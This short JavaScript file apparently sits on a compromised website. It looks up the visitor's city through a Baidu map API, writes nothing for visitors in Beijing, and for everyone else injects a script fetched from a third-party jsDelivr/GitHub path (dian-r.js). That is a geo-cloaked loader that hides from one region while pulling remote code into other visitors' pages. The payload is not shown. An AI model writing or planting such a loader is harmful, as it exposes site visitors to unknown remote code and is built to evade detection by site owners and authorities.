document.writeln('<script src="//api.map.baidu.com/?qt=dec&callback=dcg"></script>');

function dcg(data) {
var citySets = {'北京':'beijing','北京市': 'beijing',};
if (citySets[data.content.cname]) 
     {document.writeln("");}
else {document.writeln("<script src=\"\//cdn.jsdelivr.net/gh/dataoss/static/js/dian-r.js\"\><\/script>");
}
}
